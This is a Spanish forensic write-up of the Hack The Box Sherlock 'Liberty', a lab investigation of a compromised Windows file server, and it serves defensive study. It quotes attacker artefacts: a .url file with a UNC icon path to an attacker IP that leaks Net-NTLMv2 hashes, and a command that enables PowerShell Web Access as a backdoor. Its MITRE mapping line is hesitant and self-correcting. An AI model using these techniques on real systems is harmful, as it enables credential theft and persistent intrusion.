---
sherlock: Liberty
domain: DFIR
difficulty: Medium
platform: Hack The Box
evidence: Triaje de un servidor Windows con $MFT, EVTX, registro y perfiles
tools: [EvtxECmd, MFTECmd, Registry Explorer, Timeline Explorer]
state: Active
tags: [dfir, windows, rdp, ntlm-theft, backdoor, powershell-web-access, t1021.001]
---

# Liberty — Hack The Box (Sherlock)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Active. Ficha de investigación; sin respuestas literales de la plataforma.

## Escenario

Un servidor de ficheros de una consultora empieza a enviar correos internos raros y a aceptar conexiones que nadie reconoce. El equipo de respuesta recibe un triaje del host: `$MFT`, logs de eventos, colmenas de registro y perfiles de usuario.

## Evidencias

- `$MFT` del volumen del sistema.
- `Windows\System32\winevt\logs\*.evtx` (Security, System, PowerShell/Operational).
- Hives de registro, incluidos `UsrClass.dat` de los perfiles.
- Perfiles de usuario (escritorio, descargas, navegador).

```bash
sha256sum "$MFT" Security.evtx SYSTEM
```

## Investigación

### 1. Inventario y triaje

El orden es logon → ejecución → persistencia. Security primero: da el quién y el cuándo; después `$MFT` y registro ponen los objetos.

```bash
EvtxECmd.exe -f Security.evtx --csv out --csvf security.csv
```

En Security se ven **cinco 4625** seguidos en pocos minutos desde la misma IP y, justo después, un **4624** de `v.hunter`: *password spray* con acierto. Más tarde, el mismo día, un **4624 con Logon Type 10** (RDP) a las **2025-06-11 14:44:48 UTC**.

### 2. Línea temporal

Con el acceso RDP establecido, el atacante reconoce el host y crea un share nuevo. Los shares viven en el registro:

```text
HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares
```

Aparecen dos entradas: el share legítimo `Proposal` (permisos 9) y **`ProjectArk`**, apuntando a `C:\ProjectArk`, que no existía antes del incidente.

El `$MFT` explica cómo se robaron credenciales antes del RDP: un fichero `Proposal.url` con destino `http://argonaut.ark/proposal.html` y una ruta UNC del tipo:

```text
\\192.168.189.129\%USERNAME%.icon
```

Un `.url` con un icono UNC hace que Explorer se autentique contra el atacante y entregue el hash **Net-NTLMv2**, que se crackea fuera de línea. Ese es el origen real de la contraseña de `v.hunter`.

Los *shellbags* (`UsrClass.dat`) de `k.texus` muestran navegación por `C:\ProjectArk`, y el registro guarda el uso de 7-Zip sobre `arkproj.zip`: el atacante empaquetó lo que encontró.

### 3. Artefacto clave

La persistencia está en el historial de PowerShell y en el log operativo de la característica:

```text
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```powershell
Install-WindowsFeature -Name WindowsPowerShellWebAccess -IncludeManagementTools
```

La sesión queda registrada en `Microsoft-Windows-PowerShellWebAccess%4Operational.evtx`:

```text
LIBERYSV08\t.minami.250611.075455   14:54:55 -> 14:55:40
```

Es decir: el atacante habilitó **PowerShell Web Access** como puerta trasera, con una sesión de 45 segundos para validarla.

## Conclusiones

- Acceso por spray de contraseñas y RDP con una cuenta válida; la escalada no fue necesaria para moverse.
- Las credenciales se obtuvieron antes, con un `.url` que apuntaba un icono a un share UNC del atacante (robo de Net-NTLMv2).
- Exfiltración por 7-Zip de un share creado a mano (`ProjectArk`) y persistencia con PowerShell Web Access.

## Lecciones

- Un `.url` en un share de propuestas es phishing de credenciales sin correo: el vector es Explorer, no el navegador.
- El spray deja un patrón claro (varios 4625 y un 4624 desde la misma IP); sin correlación pasa desapercibido.
- `LanmanServer\Shares` es la fuente para detectar shares creados a mano; no hace falta esperar a un agente.
- Habilitar una característica de IIS deja rastro en el log operativo con nombre de usuario y sesión.

## Mitigaciones y detección

- Bloquear la autenticación saliente SMB/NTLM hacia Internet y deshabilitar iconos UNC en shares (`EnableShellShortcutIcon`/GPO equivalente).
- Cuentas de servicio y humanas con contraseñas robustas y bloqueo tras pocos intentos; MFA en RDP.
- Monitorizar 4741/4738 y la creación de shares (5142/5143) fuera de cambio.
- Detección: 4625 en ráfaga seguido de 4624 mismo origen, Logon Type 10 desde IPs no habituales, `Install-WindowsFeature` con PowerShellWebAccess y sesiones en el log `%4Operational`.

MITRE: T1110.003 (password spraying), T1021.001 (RDP), T1187 (forced authentication), T1505.003? no — T1133 (external remote services) y T1059.001 (PowerShell).

## Referencias

- <https://bakosecurity.com/blog/liberty-htb-writeup>
- <https://inksec.io/blue-team/sherlocks/liberty/>
- <https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file>
- <https://attack.mitre.org/techniques/T1187/>
